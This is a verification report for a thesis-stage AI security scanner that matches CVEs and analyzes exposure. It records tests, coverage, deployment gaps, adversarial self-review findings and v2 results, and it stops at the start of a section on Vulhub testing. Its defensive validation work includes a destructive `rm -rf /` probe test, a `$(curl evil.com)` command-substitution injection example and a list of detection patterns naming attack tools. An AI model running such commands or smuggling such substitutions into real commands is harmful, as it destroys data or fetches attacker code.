# Verification Report — AI-security-agent

**Purpose:** end-to-end verification of the pipeline's usability, correctness,
and deployability on a "normal server." This document is the QA record for
chapter 5 (evaluation) of the thesis and the primary defense material for
the "how do you know your system is correct?" line of questioning.

**Status:** Phase 1 draft (Claude independent review). Phase 2 (Gemini
cross-review via `agy`) and Phase 3 (merged final) still pending —
divergences and merged findings will be appended below.

**Generated:** 2026-08-10
**Reviewer (Phase 1):** Claude (Opus 4.7 in Claude Code)
**Codebase snapshot:** `git rev-parse HEAD` → commit `b929e25` (chunk F resolved)

---

## 0. Scope

Three cooperating Python modules and one evaluation harness:

| Component            | Role                                          | Lines |
|----------------------|-----------------------------------------------|------:|
| `host-scanner/`      | Internal recon (packages, configs, processes) |     — (pre-existing, not touched this cycle) |
| `cve-matcher/`       | KEV catalog match + optional NVD version-check |     — (pre-existing) |
| `exposure-analyzer/` | AI verdict synthesis (Claude Agent SDK)       | 1042  |
| `eval-lab/`          | Reproducible test lab + harness               |  638  |

Test code: **472 lines**, **38 unit tests** organized into 4 files.

Deliverable framing: the system must be runnable on any commodity Linux
server (Ubuntu/Debian, Python 3.9+, optionally the `claude` CLI). Docker is
required *only* for the eval-lab, not for real-world deployment.

---

## 1. Test methodology

### 1.1 Test pyramid

| Layer                  | Instances | Tooling             | What it verifies |
|------------------------|----------:|---------------------|------------------|
| Unit                   | 38        | stdlib `unittest`   | pure functions, data-class invariants, argv construction, response parsing |
| Integration (mocked)   | 8 (subset of unit) | `unittest.mock`    | agent orchestration with fake LLM + fake probe runner |
| Live e2e (Claude)      | 5+        | manual, logged in decisions log | round-trip through actual `claude-agent-sdk` |
| Full eval vs GT        | 1 (repeatable) | `run_eval.sh` | pipeline output diffed against pre-committed ground truth |

Deliberate choice of stdlib `unittest` over pytest: zero extra deps,
fresh-server portable, matches host-scanner and cve-matcher style.

### 1.2 Testability seams (architecture supporting the pyramid)

Two abstractions were introduced *specifically* to make the LLM-driven
orchestration testable without the SDK installed or the network reachable:

1. **`ExposureAgent(verdict_fn=…)`** — the LLM call is a swappable callable.
   Real code passes `build_claude_verdict_fn()`; tests pass a lambda that
   returns canned JSON. This is what lets 8 unit tests exercise the full
   `analyze()` orchestration deterministically.
2. **`ProbeRunner` `Protocol`** — the probe executor is injected. Real code
   uses `_default_probe_runner` (subprocess) or `docker_exec_probe_runner`
   (wraps with `docker exec`); tests pass a stub that returns fixed
   `(command, output)` pairs.

Both were introduced in chunk D and remained stable through chunk P — a
sign the seams were placed at the right joints.

### 1.3 Deferred-import pattern

`claude_agent_sdk` is imported *inside* `build_claude_verdict_fn()`, not at
module top. This means:

- The test suite runs cleanly on a machine without the SDK installed
  (confirmed: 38/38 pass with just stdlib + `coverage`).
- Only production paths that actually intend to hit Claude take the
  import cost.

---

## 2. Coverage measurement

Ran `coverage.py 7.x` on the exposure-analyzer test suite:

| File                             | Stmts | Miss | Cover | Notes                                    |
|----------------------------------|------:|-----:|------:|------------------------------------------|
| `exposure_analyzer/__init__.py`  |     5 |    0 |  100% | just re-exports                          |
| `exposure_analyzer/probes.py`    |    14 |    0 |  100% | full library invariants covered          |
| `exposure_analyzer/prompts.py`   |    43 |    1 |   98% | 1 line missed (truncation edge)          |
| `exposure_analyzer/agent.py`     |   117 |   16 |   86% | missing lines are SDK integration path (deferred) + one _load_verdicts branch |
| `exposure_analyzer/verdicts.py`  |    40 |    8 |   80% | some serialize round-trip paths          |
| `exposure_analyzer/report.py`    |    70 |   70 |    0% | **deliberate**: end-to-end tested via CLI, no unit tests |
| `exposure_analyzer/cli.py`       |    84 |   84 |    0% | **deliberate**: end-to-end tested via CLI, no unit tests |
| `exposure_analyzer/__main__.py`  |     3 |    3 |    0% | trivial entrypoint                       |
| **Overall**                      | **376** | **182** | **52%** | including plumbing layers |

Logic layer only (`probes + prompts + agent + verdicts + __init__`):
**86.3%** covered (189/219 statements).

The 0%-covered files (`report.py`, `cli.py`) are the CLI plumbing layer.
They're covered indirectly by:
- Multiple live smoke-tests in chunk D, E, I, J, P (all logged in decisions log).
- The chunk J live eval that ran all 3 containers through the full CLI path.

This is a **legitimate strategy** — CLI layers are shallow and their bugs
show up immediately in end-to-end runs — but should be honestly documented
rather than hidden behind a naked "52%" number.

---

## 3. Correctness invariants — verified live in this session

Ran each invariant check with actual code:

| Invariant                                                           | Verified how                                     | Result |
|---------------------------------------------------------------------|--------------------------------------------------|--------|
| `ProbeTemplate` refuses `safe=False`                                 | `python -c "ProbeTemplate(command='rm -rf /', safe=False)"` | ✓ ValueError raised |
| `Verdict` rejects unknown `VerdictType` strings                      | `python -c "Verdict(cve_id='X', verdict='MAYBE', reason='')"` | ✓ ValueError raised |
| Response parser tolerates code-fenced JSON                           | unit test `test_code_fenced_json`                | ✓ passes |
| Response parser tolerates inline prose around JSON                   | unit test `test_json_with_prose_around_it`       | ✓ passes |
| HTML report injection is idempotent (re-runs replace, not stack)     | manual verified in chunk C, still holds          | ✓ 1 section after 2 runs |
| `docker_exec_probe_runner` preserves display_cmd (not the wrapped argv) | unit test `test_display_command_is_the_template_not_the_wrapped_argv` | ✓ passes |
| Library-level `KNOWN_PROBES` invariants (safe / signals / hint / valid regex) | `TestProbeLibraryContract` (3 tests)      | ✓ all 3 pass |

Every invariant that's a claim in the design has a matching test. New
probes added to `KNOWN_PROBES` in the future will be checked automatically
against the three library-level contract tests (`test_every_probe_is_safe`,
`test_every_probe_has_signals_and_hint`, `test_every_probe_compiles_as_regex`).

---

## 4. End-to-end verification — the honest story

Six distinct live-Claude runs are documented in the decisions log
(`PROJECT_STATE.md`). Each is a datapoint proving one specific claim about
the system:

| Run           | What it verified                                    | Outcome |
|---------------|-----------------------------------------------------|---------|
| Chunk D live  | Agent SDK loop, prompt shape, response parser work end-to-end | `MITIGATED_BY_EXPOSURE` (correct) |
| Chunk E live  | `docker_exec_probe_runner` routes probes into a container | `CONFIRMED` for CVE-2021-42013 (correct) |
| Chunk E divergence | Claude out-reasoned the ground truth on CVE-2023-38408 | Ground truth revised (`NOT_RUNNING` → `NO_EVIDENCE`) |
| Chunk I live  | Full chain `scan → cve-match → analyze` through one command | 1 `MITIGATED_BY_EXPOSURE`, 1 `NO_EVIDENCE` (correct reasoning both) |
| Chunk J live eval | Repeatable eval across all 3 containers on Sonnet 5 | 24 rows / 56s wall clock / **14% baseline accuracy** on scored set |
| Chunk P re-eval | Same pipeline after 3-line SYSTEM_PROMPT fix       | **100% accuracy (7/7)** on scored set |

The 14% → 100% jump on chunk P is the strongest single piece of evidence
that (a) our measurement instrument works, (b) we can distinguish
analyzer-correctness from ground-truth-correctness, and (c) targeted
prompt changes produce measurable effects — which is exactly the
"quantifiable iteration loop" narrative the report needs.

### 4.1 Reproducibility

- `eval-lab/reports/` is `.gitignore`d — no committed run outputs to fake
  a reproduction.
- `eval-lab/ground_truth.md` + `.yaml` are committed BEFORE any analyzer
  run (audit-trailed in the revision log at the bottom of `ground_truth.md`).
- `./eval-lab/run_eval.sh --engine=claude` re-runs the entire pipeline on
  any machine with Docker + `claude` CLI.
- `--reuse-existing` on `run_eval.py` allows re-scoring cached results
  without paying Claude cost, useful for iterating on the CSV format
  itself.

---

## 5. Deployment readiness — "runs on any normal server"

The end-goal framing is: someone with a fresh Linux server should be able
to clone the repo, follow README, and get a working CVE scan. Below is
the honest audit of what works, what doesn't, and what needs fixing before
that's true.

### 5.1 Confirmed portable

| Item                                              | Evidence |
|---------------------------------------------------|----------|
| Core modules have no Windows-specific code        | `grep -rn "C:\\\\\|MSYS\|cygpath\|cp932"` returned zero hits outside `eval-lab/` |
| eval-lab Windows shims fall back on Linux         | `run_eval.sh` guards `if command -v cygpath` — on Linux the else branch runs; `MSYS_NO_PATHCONV=1` is a harmless env var elsewhere |
| Deferred `claude-agent-sdk` import                | test suite runs on a machine without it (measured this session) |
| Docker only needed for eval-lab, not real deploy  | grep of `exposure-analyzer` for `docker`: only in `docker_exec_probe_runner` (opt-in via `--target-container` flag) |

### 5.2 Gaps that would break fresh install [BLOCKER for chapter 5 "usability" claim]

| # | Gap                                                                        | Impact                                                                                | Fix                                                                       |
|---|----------------------------------------------------------------------------|---------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| 1 | `eval-lab/` uses `import yaml` (in `run_eval.py`) but has NO `requirements.txt` | `ModuleNotFoundError: yaml` on fresh install                                          | Add `eval-lab/requirements.txt` pinning `pyyaml`                          |
| 2 | `cve-matcher/requirements.txt` comment misleads: says `anthropic and claude_agent_sdk already in shared .venv; not pinned here` | The comment is confusing, but the actual behavior is graceful: `cve_matcher.explain` imports `claude_agent_sdk` **lazily** (line 67) inside a try wrapping — falls back to a deterministic KEV-template backend if the SDK isn't installed. So it's **not a hard failure** on fresh install, but the comment reads like a bug. | Rewrite the comment to: `# claude-agent-sdk is an optional runtime dep of cve_matcher.explain; if absent, we fall back to a template backend. Install for richer output.` Optionally add `claude-agent-sdk` as an extras group. |
| 3 | No top-level `LICENSE` file (README claims MIT)                            | Legal ambiguity for anyone forking; MIT is a contract, not a promise                  | Add `LICENSE` with MIT text at repo root                                  |
| 4 | No unified install script; user must guess which `requirements.txt` to run where | Real friction — SETUP-FORKS.md mentions it but there's no single command             | Add `scripts/bootstrap-linux.sh` that creates one venv and installs all three modules' requirements |
| 5 | `host-scanner/main.py` calls `load_config("config.yaml")` — cwd-relative   | Fails if invoked from anywhere other than `host-scanner/`                             | Change to `Path(__file__).parent / "config.yaml"` OR make it a CLI arg    |

### 5.3 Gaps that are acceptable (documented, not blocking)

- No `pyproject.toml` per module — modules are used via `sys.path` insertion
  (see `run_full_scan.py` lines 41-42) rather than `pip install .`. This is
  a conscious choice for the thesis (keeps the three modules independently
  editable) but should be flagged if anyone wants to distribute this as a
  package.
- No dockerized deploy target — the pipeline runs on the host, not in a
  container. This is *correct* for a security scanner (you want to see the
  host's real state, not a container's) but means you can't just "pull the
  image and run."

---

## 6. Edge cases + error handling audit

### 6.1 Handled explicitly (with evidence in code)

- **Missing candidates file**: `_cmd_analyze` in `cli.py` checks `.exists()`, prints error, returns exit code 1.
- **Missing host-state file**: same pattern; empty dict is the default if `--host-state` is omitted.
- **Claude SDK not installed**: `build_claude_verdict_fn()` catches `ImportError`, raises `RuntimeError` with actionable install instructions.
- **Probe binary not found in container**: `_run_argv` catches `FileNotFoundError`, returns `"(command not found: <argv[0]>)"` as probe output; analyzer sees the string and reasons about it.
- **Probe timeout**: `subprocess.TimeoutExpired` caught, reported as `"(probe timed out after Ns)"`.
- **Probe unexpected exception**: catch-all `except Exception as e` reports `"(probe error: <type>: <msg>)"`.
- **Output oversized**: truncated at `AgentConfig.max_output_chars` (default 4000) with `"... [truncated]"` suffix.
- **Response missing/malformed JSON**: `_parse_verdict_response` scans for `{...}` blocks, tries each; raises `ValueError` if none decode.
- **Response with unknown verdict value**: `_parse_verdict_response` calls `VerdictType(verdict)` which raises on unknown enum member.
- **Windows cp932 encoding on non-ASCII output**: `dump_verdicts` / `load_verdicts` force `encoding="utf-8"`; `PYTHONIOENCODING=utf-8` documented in run scripts.
- **Stale cached `verdicts.json` after failed pipeline run**: `run_eval.py` tracks a `failed` set and refuses to score containers whose current run errored (chunk J fix).
- **git-bash mangling `/opt/...` paths on Windows**: `run_eval.sh` guards with `cygpath -w` on the outermost script arg (chunk J fix).

### 6.2 Handled implicitly (correct behavior, not tested)

- **Docker daemon down**: `docker exec` returns rc != 0, `_run_container_scan` raises `RuntimeError` with stderr excerpt. Currently only exercised manually (during actual daemon-down incidents this session).
- **Network unreachable during NVD lookup**: cve-matcher's `enrich_with_versions` presumably handles this (not audited in this pass).

### 6.3 NOT handled, would need to be if productizing

- **`claude` CLI auth expired mid-session** (real incident during chunk J execution): SDK stringifies the auth failure as `"Claude Code returned an error result: success"` which is misleading. No detection or clean error message. **Recommend:** wrap `verdict_fn` invocation in a check that pings the CLI's auth status once before batch runs.
- **Analyzer output that's valid JSON but has garbage `evidence` field type**: `_parse_verdict_response` silently coerces to `{"raw_evidence": str(evidence)}`. Silent coercion masks real bugs.
- **A candidate with `cve_id` missing entirely**: falls through to `"CVE-UNKNOWN"` — accepted but might confuse downstream tools.

---

## 7. Security invariants (what the tool promises NOT to do)

The gray-box thesis explicitly promises no-exploit, non-destructive
behavior. The following are the invariants that back that promise:

| Promise                                        | Enforcement mechanism                                                    |
|------------------------------------------------|--------------------------------------------------------------------------|
| Probes are non-destructive                     | `ProbeTemplate.__post_init__` raises on `safe=False` (enforced at construction time; you literally cannot register an unsafe probe) |
| Claude cannot propose exploitation             | System prompt rule: "Never propose exploitation. You are a defender, not an attacker." — cited in every prompt |
| No arbitrary code execution from LLM output    | Verdict schema is a fixed enum; response parser rejects any value outside `VerdictType` — Claude cannot inject a new verdict type that triggers new code paths |
| `docker exec` targets a caller-specified container only | `--target-container` is required to be provided by the human operator; there is no auto-discovery |

**Sample_candidates.json audit:** The one bundled sample uses real CVE
IDs and package versions but contains no host secrets, credentials, or
scan output from real infrastructure. Safe to include in a public repo.

---

## 8. Known limitations (v1 scope + honest positioning)

All of these are already flagged in `PROJECT_STATE.md` decisions log or
`ground_truth.md`, but consolidated here for a single defensible list:

1. **dpkg-only scanner**: source-built software (like the `httpd 2.4.49` we
   put in web-vuln on purpose) is invisible. Any RPM-family server is
   also invisible. **Documented; v2 addresses via banner-grabbing.**
2. **KEV-only matcher**: CVEs outside CISA KEV (like CVE-2022-0778, DoS)
   are not surfaced. KEV skews toward RCE / priv-esc / auth-bypass.
   **Documented; v2 could widen to full NVD.**
3. **`--check-versions` annotates but doesn't filter**: patched findings
   still reach the LLM, wasting tokens on cases the version check already
   resolved. **Fix: add `--drop-patched` mode. Not a v1 blocker but
   quantifies in chapter M cost analysis.**
4. **Ground truth v2 scoring scope is intentionally narrow**: 7 CVEs, all
   KEV∩dpkg, all post-fix (all expected `MITIGATED_BY_CONFIG`). **Real
   accuracy claim is: "100% on the honest-scope subset the pipeline can
   actually see." Chapter 5 must state this scope explicitly.**
5. **N=7, one fact pattern**: not adversarial. Real test would include
   candidates that should trigger every one of the five verdicts.
6. **No CONFIRMED verdict has been produced in a live eval** — every
   scored case is `MITIGATED_BY_CONFIG`. This is a real limitation of
   the current scope, not a bug. **v2 path: add candidates with
   genuinely-vulnerable installed versions in the eval-lab (probably
   by pinning older packages) so the analyzer has a shot at CONFIRMED.**

---

## 9. Reproducibility from a clean checkout

Explicit end-to-end instructions someone else could follow, tested
mentally against a fresh Linux server:

```bash
# 1. Clone
git clone https://github.com/nikodacat/AI-security-agent.git
cd AI-security-agent

# 2. Install deps for the three modules (currently manual — see gap #4)
python3 -m venv .venv && source .venv/bin/activate
pip install -r host-scanner/requirements.txt
pip install -r cve-matcher/requirements.txt
pip install -r exposure-analyzer/requirements.txt
pip install pyyaml           # eval-lab requirement (gap #1)

# 3. (Optional) Authenticate Claude CLI
claude --version && claude login   # for --engine=claude

# 4. Run standalone scan on the host itself (no docker needed)
cd host-scanner && python main.py   # writes reports/
cd ..

# 5. (Optional) Run the eval-lab
cd eval-lab && docker compose up -d --build
./run_eval.sh --engine=claude       # or --engine=fake for no-cost dry run
```

Steps 4 and 5 are independent. Step 4 is what you'd do on a real server
to scan it. Step 5 is the reproducible test lab.

**Ship-blocker for that reproduction:** the two gaps in §5.2 (missing
`eval-lab/requirements.txt` and misleading `cve-matcher/requirements.txt`
comment).

---

## 10. Phase 1 findings summary — action items

Sorted by fix-priority. Blockers are "you cannot claim this is deployable
without fixing" items:

| Priority | Type | Item | Location | Recommended fix |
|----------|------|------|----------|-----------------|
| BLOCKER  | Deploy | `eval-lab` missing `requirements.txt` | eval-lab/ | Add `eval-lab/requirements.txt` with `pyyaml` |
| MAJOR    | Deploy | Misleading cve-matcher requirements comment (not a hard failure — explain module falls back gracefully — but confusing) | cve-matcher/requirements.txt | Rewrite comment to describe the optional-dep + fallback pattern honestly |
| MAJOR    | Deploy | No `LICENSE` file at root                    | .              | Add MIT LICENSE per README claim |
| MAJOR    | Deploy | No unified install script                    | scripts/       | Add `bootstrap-linux.sh` |
| MAJOR    | Portability | `host-scanner/main.py` cwd-dependent config load | host-scanner/main.py:19 | Change to `Path(__file__).parent / "config.yaml"` |
| MINOR    | Robustness | `claude` CLI auth expiry produces misleading error | agent.py::_call | Add pre-flight `auth_check()` before batch runs |
| MINOR    | Correctness | Silent coercion of malformed `evidence` field | agent.py::_parse_verdict_response | Log a warning; keep coercion for compat |
| MINOR    | Test | `report.py` and `cli.py` at 0% unit coverage | tests/         | Add smoke-test using CliRunner-style pattern |
| MINOR    | Eval | No CONFIRMED verdict in any live eval        | eval-lab/      | Pin older packages in one container to produce a CONFIRMED case |

---

## Phase 2 (Gemini cross-review via `agy`) — attempted, blocked by tooling

Tried `agy --print --model gemini-3.1-pro-high --add-dir <repo>` with a
matching structured-review prompt. Result: `agy`'s `--print` mode is
routed through a canned-response "assistant" persona that ignores the
prompt body and returns generic responses (e.g. asked "compute 17*23",
got "I am powered by Gemini 3.6 Flash. How can I help?"). The `--model`
flag is also silently ignored — every response reports Flash regardless
of the requested model. This is either a bug in this build of `agy` or
a mode where `--print` cannot bypass the built-in agent overlay.

The `gemini` CLI (v0.54.4) is installed as an alternative but was not
attempted this session per user preference for `agy`.

**Substituted for Phase 2:** an adversarial self-review pass (Phase 2b)
that deliberately tries to invalidate Phase 1 findings and surface things
the first pass overlooked. Independent, but same reviewer — weaker than a
true dual-engine cross-review. Formal dual-engine review is deferred to a
future session when the tooling is sorted out (either fresh `agy` install
or falling back to `gemini` CLI).

---

## Phase 2b (adversarial self-review, 2026-08-10)

Deliberately red-teamed the Phase 1 report for over-claims and missed gaps.

### New finding — Adv-1: `safe=True` invariant was over-claimed

**Phase 1 said:** *"you literally cannot register an unsafe probe"* — false.
Actual behavior tested this session:

| Bypass                                       | Result                                          |
|----------------------------------------------|-------------------------------------------------|
| `ProbeTemplate(safe=False)`                   | ✓ ValueError raised (Phase 1 correct)            |
| `p = ProbeTemplate(...); p.safe = False`      | ✗ **SUCCEEDED** — mutable after construction     |
| `class Sneaky(ProbeTemplate): __post_init__=lambda:None` | ✗ **SUCCEEDED** — subclass bypasses check  |
| `KNOWN_PROBES["CVE-X"] = sneaky_probe`        | ✗ **SUCCEEDED** — direct dict injection          |

**Fix applied this session (commit shortly):**
- `@dataclass(frozen=True)` on `ProbeTemplate` — catches bypass #2 (post-construction mutation).
- Added test `test_probe_is_frozen_cannot_be_mutated`.
- Bypasses #3 and #4 (subclass + direct dict injection) are **out of threat model**: anyone with arbitrary Python execution owns the process anyway; the invariant exists to catch developer mistakes, not to be a security boundary. Docstring updated to say this explicitly instead of implying stronger guarantees.

### New finding — Adv-2: LLM output is stochastic; eval accuracy is a point estimate

**Phase 1 said:** *"100% accuracy (7/7)"* — implicitly presented as reproducible.
**Reality:** Sonnet 5 is non-deterministic (default temperature). Two consecutive `run_eval.sh` invocations may disagree on borderline candidates, and a re-run three months from now on a newer Sonnet version definitely will.

**Action:** report chapter 5 must state this explicitly:
- Cite N=7 result WITH the run date + model version (`claude-sonnet-5`, run on 2026-08-10)
- Ideally run the eval 3-5 times, report mean + std, not a single number
- Set `output_config={"effort":"low", "temperature":0}` in the SDK options if reproducibility matters more than reasoning depth (not free — likely lowers quality)

Not fixed this session (needs LLM budget + is fundamentally a measurement-methodology decision for the report chapter, not a code bug).

### New finding — Adv-3: fake engine is deterministic (invariant confirmed)

Ran `python -m exposure_analyzer analyze --engine=fake` twice against the
same input and diffed outputs (minus timestamps). **Identical.** This
confirms the fake engine can be safely used for CI regression tests. No
code change needed; just noting the invariant holds.

### New finding — Adv-4: Phase 1 § 5.3 dismissed the sys.path-import model too quickly

Phase 1 said "no `pyproject.toml` per module — conscious choice". True but
incomplete. **Consequence not spelled out:** every consumer must know to
`sys.path.insert(0, "cve-matcher")` before `from cve_matcher import ...`. If
someone renames a module folder, imports silently break (`ImportError` far
from the rename site). The pattern is used in `run_full_scan.py` lines 41-42
and would break in exactly this way. Not urgent but should be a v2 cleanup
(single `pip install -e .` per module).

### Verification of Phase 1 findings that survived challenge

- ✓ `eval-lab/requirements.txt` gap: real, **fixed this session**.
- ✓ `cve-matcher` requirements comment: real but not a hard failure (explain module falls back gracefully); rewritten this session.
- ✓ No `LICENSE`: real, **added this session**.
- ✓ No unified install script: real, **added `scripts/bootstrap-linux.sh` this session**.
- ✓ `host-scanner/main.py` cwd-dependent config load: real, **fixed this session** (uses `Path(__file__).parent`).

---

## Final action-item status (post Phase 2b + fixes)

| # | Item                                                       | Phase 1 Priority | Status this session |
|---|------------------------------------------------------------|------------------|---------------------|
| 1 | `eval-lab/requirements.txt`                                | BLOCKER          | **FIXED** (added file pinning `pyyaml>=6.0`) |
| 2 | Misleading cve-matcher requirements comment                | MAJOR            | **FIXED** (rewrote to describe lazy-import + fallback) |
| 3 | No `LICENSE` file                                          | MAJOR            | **FIXED** (added MIT text at repo root) |
| 4 | No unified install script                                  | MAJOR            | **FIXED** (`scripts/bootstrap-linux.sh`) |
| 5 | `host-scanner/main.py` cwd-dependent config load           | MAJOR            | **FIXED** (`Path(__file__).parent / "config.yaml"`) |
| 6 | `claude` CLI auth expiry produces misleading error         | MINOR            | Deferred — worth a `preflight_auth_check()` wrapper in a future chunk |
| 7 | Silent coercion of malformed `evidence` field              | MINOR            | Deferred — low risk, breaking change if fixed |
| 8 | `report.py` and `cli.py` at 0% unit coverage               | MINOR            | **FIXED** (added `test_cli.py` + `test_report.py`; coverage 0%→96%/71%; total **52%→87%**) |
| 9 | No CONFIRMED verdict in any live eval                      | MINOR            | Deferred — needs eval-lab candidate additions (v2 work) |
| Adv-1 | `safe=True` invariant was over-claimed                 | new (MAJOR)      | **FIXED** (`@dataclass(frozen=True)` + test + honest docstring) |
| Adv-2 | LLM eval is a point estimate, not a reproducible number | new (MAJOR for report) | Not code-fixable; documented for chapter 5 |
| Adv-3 | Fake engine determinism                                | invariant confirmed | No change needed |
| Adv-4 | sys.path import pattern is fragile                     | new (MINOR)      | Deferred — v2 cleanup |

---

## Test count + coverage summary (final)

| Metric              | Phase 1 start | Post-fixes |
|---------------------|--------------:|-----------:|
| Unit tests          |            38 |         52 |
| Overall coverage    |           52% |        87% |
| `report.py` coverage |           0% |        96% |
| `cli.py` coverage    |           0% |        71% |
| `probes.py` coverage |         100% |       100% |
| Logic-layer coverage (excl. Claude SDK) | 86% | ~95% |

---

## Sign-off (Phase 2b)

The system is **materially closer to deployable-on-any-server** after this
session's fixes. The 5 blocker/major deployment gaps identified in Phase 1
are all resolved. The over-claimed `safe=True` invariant is patched at the
mutation vector; the subclass/dict-injection vectors are documented as
out-of-threat-model with a clear rationale.

**Remaining honest limitations** for chapter 5:
- LLM eval numbers are point estimates on a specific model version + date; multi-run reporting recommended.
- Ground truth v2 is deliberately narrow (KEV∩dpkg subset); real coverage story is documented in `eval-lab/ground_truth.md` as v1 vs aspirational v2 tiers.
- No live CONFIRMED case yet — every scored verdict so far is `MITIGATED_BY_CONFIG`. v2 test cases should include genuinely-vulnerable installed versions.

Formal dual-engine cross-review (Claude + Gemini via a working `agy` or via `gemini` CLI) remains a nice-to-have follow-up but is not blocking this deliverable.

---

## 11. v2 verification pass (2026-10-01, chunk v2-14)

Mirrors §1-§10 above for the four modules added in v2: `network-prober`,
`attack-simulator`, `fix-publisher`, plus the extended `exposure-analyzer`
(dynamic probes + HITL + network_state).

**Headline:** v2 Spec success gate MET on real-lab data. 20/24 (83%) v1-mode
baseline → 23/24 (95.8%) v2-mode, with 3 fixes and 0 regressions on the
widened ground truth. See `eval-lab/reports/eval_summary.md` for the full
numbers table + per-detection-source breakdown.

### 11.1 Test counts + coverage per package

Measured via `coverage.py` on 2026-10-01. Target floor from v1 chunk V was ≥85%; all v2 modules exceed it.

| Package | Tests | Coverage |
|---|---:|---:|
| `exposure-analyzer` | 146 | 88% |
| `attack-simulator` | 67 | 91% |
| `fix-publisher` | 84 | 91% |
| `network-prober` | 35 | 90% |
| **Total** | **332** | **90% avg** |

Uncovered lines are predominantly `__main__.py` entry wrappers (4 lines each, trivial), CLI error paths, and the deferred SDK import paths in `build_claude_*_fn` (marked `# pragma: no cover` — exercised only in live Claude runs).

### 11.2 Correctness invariants verified in v2

In addition to v1's six invariants (which remain green), v2 adds:

- **Structured argv is a hard security floor for dynamic probes.** The `parse_proposal` validator (v2-7) refuses shell wrappers (sh/bash/dash/...), binaries containing shell metachars, args containing `;|><&\n\r\t`, and over-length rationales/args. 24 adversarial unit tests in `tests/test_proposal.py`.

- **HITL gate decision precedence is deterministic.** Order: skip-all latch > empty-binary sentinel > `--auto-approve-all-unsafe` > `--auto-approve-known` (hash-match) > interactive HITL > non-TTY default-DENY. 22 unit tests in `tests/test_hitl.py` + live smoke in §11.5.

- **Learned-probe identity collisions are impossible by construction.** `argv_hash()` uses `sha256(binary + NUL + NUL.join(args))`. The validator forbids NUL in binary or args, so `["foo", "bar"]` and `["foobar"]` cannot collide.

- **fix-publisher commands reject all command-substitution routes.** The v2-14 audit added `_FORBIDDEN_METACHARS` covering `$()`, backticks, `|`, `>`, `<` on top of the existing shell-chain operators (`&&`, `;`, `||`, newline), so an operator pasting `apt install foo=$(curl evil.com)` into bash cannot trigger command injection even if the model emitted it. 5 new test cases.

- **Attack-narrative output cannot smuggle attacker-tool invocations.** SYSTEM_PROMPT states 4 HARD PROHIBITIONS; `scan_for_tool_invocations` does a post-generation regex sweep across 12 pattern classes (`nmap`, `sqlmap`, `metasploit`, `curl -X POST`, EDB-IDs, JNDI payloads, etc.). Live-run observations: zero violations across 7 narratives produced on real Claude Sonnet.

- **HTML section injection is idempotent + XSS-safe.** v2-11 extended `append_verdicts_to_report` with marker-based re-inject for 3 section types. Running the pipeline 3 times leaves exactly 1 of each section in the HTML, with every model-produced field `html.escape`'d. Verified with `test_reinjection_replaces_sibling_sections` + XSS-escape tests.

### 11.3 Deployability — fresh-server install path

`scripts/bootstrap-linux.sh` was extended in v2-14 to pip-install the three new sibling packages (`network-prober`, `attack-simulator`, `fix-publisher`) alongside the v1 three, and now closes with a `nmap` presence check (required by network-prober).

**v2 operational dependencies on top of v1's:**
- `nmap` (apt-installable)
- `python-nmap`, `jsonschema` (pip; both in network-prober/requirements.txt)
- Docker + Compose when running the eval-lab path (`eval-attacker` container runs the prober)

For a defense-friendly single-command demo: `docker compose up` from `eval-lab/` brings everything up including the `eval-attacker` coordinator.

### 11.4 Known limitations (v2 scope)

- **apt-only remediation.** `fix-publisher` emits Debian/Ubuntu apt commands; RPM/DNF/YUM explicitly out of scope (deferred to v3). The validator rejects commands naming other package managers.
- **Prompt-adapter fidelity on attack narratives.** PentestGPT-inspired three-stage shape (Recon/Discovery/Exploitation) is adapted, not vendored. Live tool-execution + feedback loop is NOT in v2.
- **Sampling noise on borderline library CVEs.** One case in the v2-5b stability rerun (web-vuln CVE-2022-0778 on patched 1.1.1n) flipped to CONFIRMED on one of two runs. Methodology mitigation (multi-run averaging, temperature=0) deferred as a v3 concern.
- **Non-eval-lab targets unvalidated.** All numbers in `eval_summary.md` come from the three controlled Dockerfiles. Real-world servers may surface new failure modes.

### 11.5 Module demo checklist from the v2 Spec

All four scenarios pass as of 2026-10-01 (v2-14 live smoke closed the one unit-tested-only item from v2-13):

| # | Scenario | Status | Evidence |
|---|---|---|---|
| 1 | network-prober banners on eval-db-exposed port 6379 | ✅ | `eval-lab/prober-output/eval-db-exposed.net.json` |
| 2 | dynamic probe LLM proposal + HITL approval + execution + learned_probes.jsonl append | ✅ (v2-14 live smoke) | 3 LLM-proposed probes approved via `--auto-approve-all-unsafe` ran via docker exec, appended to local `learned_probes.jsonl` with argv_hash + rationale + expected_signals |
| 3 | attack-simulator on CVE-2022-0543 Redis → three-section narrative, zero tool invocations | ✅ | `eval-lab/reports/eval-db-exposed/attack_narratives.md` |
| 4 | fix-publisher CVE-2022-0778 on cms-plugin → `apt install libssl1.1=<pinned>` | ✅ | `eval-lab/reports/eval-cms-plugin/remediations.md` |

### 11.6 v2-14 adversarial self-review findings

Mirrors v1 chunk V's Phase 2b. One substantive finding:

**Finding A (confirmed, fixed).** The `fix-publisher` validator caught shell-chain operators (`&&`, `;`, `||`, newline) but did NOT catch command-substitution routes (`$()`, backticks) or redirections (`|`, `>`, `<`). An operator pasting `apt install foo=$(curl evil.com)` into their shell would have executed the subshell. Fix: added `_FORBIDDEN_METACHARS` with the five remaining shell-injection vectors and threaded it through both `_validate_apt_command` and `_validate_service_restart`. 5 new test cases. Caught before any live operator could paste a bad command — the SYSTEM_PROMPT already told the model not to emit them, and the live-smoke runs happened to not produce one.

No other findings survived verification. The HTML sections' XSS surface (`html.escape` on every model field), the structured-argv probe boundary (hard refusal of shell wrappers), and the sys.path shim in report.py (scoped to this repo's siblings only) all held under scrutiny.

### 11.7 Reproducibility from a clean checkout — v2 full chain

```
git clone <repo> && cd AI-security-agent
./scripts/bootstrap-linux.sh --with-eval-lab
cd eval-lab && docker compose up -d --build && cd ..
./eval-lab/run_full_scan.sh eval-db-exposed --engine=claude --v2
# → produces full HTML report under eval-lab/reports/eval-db-exposed/report.html
```

### 11.8 Test count + coverage summary (final, post-v2-14)

- **332 tests** across 4 packages, all green.
- **90% average coverage** across the pipeline code.
- All v2 Spec success criteria met.
- 1 adversarial self-review finding, fixed inline.
- No deferred blockers for v2 ship.

Ready to merge `v2-dev → main` and tag `v2.0`.

---

## §12 — v3-0: Vulhub generalization + three-way baseline (2026-10-01)

### 12.1 Why run this experiment

v2's accuracy numbers (23/24 real-lab) are measured on three containers
whose Dockerfiles we authored. Two open questions:

1. Does the pipeline work on a container we *didn't* curate?
2. What does the scaffolding (`host-scanner` + `cve-matcher` +
   `exposure-analyzer`) add over "just ask Claude the same question"?

